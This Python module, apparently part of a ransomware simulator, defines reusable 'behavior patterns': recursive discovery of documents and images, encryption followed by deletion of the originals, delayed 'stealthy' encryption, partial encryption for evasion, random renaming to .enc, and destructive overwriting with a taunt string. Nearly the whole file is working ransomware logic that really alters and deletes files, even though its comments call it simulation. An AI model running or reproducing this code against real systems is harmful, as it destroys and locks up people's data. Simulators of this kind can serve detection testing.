import os
import time
import random
import logging
from pathlib import Path
from typing import List, Callable

from .encryption import encrypt_file

logger = logging.getLogger("BehaviorPatterns")


def rename_files_randomly(files: List[Path]):
    """
    Renames each file in the list to a random name with .enc extension.
    """
    logger.info("Renaming files randomly...")
    for file in files:
        if not file.is_file():
            continue
        new_name = file.parent / (''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12)) + ".enc")
        file.rename(new_name)
        logger.debug(f"Renamed {file.name} -> {new_name.name}")


def delay_encryption(files: List[Path], delay: float = 0.5):
    """
    Encrypts files with a delay between each, simulating stealthy behavior.
    """
    logger.info(f"Encrypting files with delay of {delay}s between each...")
    for file in files:
        encrypt_file(file)
        file.unlink()
        logger.debug(f"Encrypted and removed {file.name}")
        time.sleep(delay)


def deep_directory_traversal(root: Path, extensions: List[str] = [".txt", ".docx", ".jpg"]) -> List[Path]:
    """
    Recursively finds all files matching the given extensions under a root path.
    """
    logger.info("Traversing directories deeply to find target files...")
    matched_files = []
    for ext in extensions:
        matched_files.extend(root.rglob(f"*{ext}"))
    logger.info(f"Found {len(matched_files)} files to process.")
    return matched_files


def selective_encryption(files: List[Path], percent: float = 0.3):
    """
    Encrypts a percentage of files, leaving others untouched (evasion simulation).
    """
    logger.info(f"Encrypting {percent*100:.0f}% of available files for evasion.")
    total = len(files)
    target_count = int(total * percent)
    selected = random.sample(files, min(target_count, total))

    for file in selected:
        encrypt_file(file)
        file.unlink()
        logger.debug(f"Encrypted {file.name}")


def overwrite_file_contents(files: List[Path], filler: str = "YOU_HAVE_BEEN_PWNED"):
    """
    Overwrites file contents instead of deleting or encrypting (destructive pattern).
    """
    logger.info("Overwriting file contents destructively...")
    for file in files:
        try:
            with open(file, "w") as f:
                f.write(filler * 100)
            logger.debug(f"Overwritten {file.name}")
        except Exception as e:
            logger.error(f"Failed to overwrite {file.name}: {e}")


# Registry of predefined behavior patterns
BEHAVIOR_PATTERNS: dict[str, Callable[..., None]] = {
    "rename_files_randomly": rename_files_randomly,
    "delay_encryption": delay_encryption,
    "deep_directory_traversal": deep_directory_traversal,
    "selective_encryption": selective_encryption,
    "overwrite_file_contents": overwrite_file_contents,
}
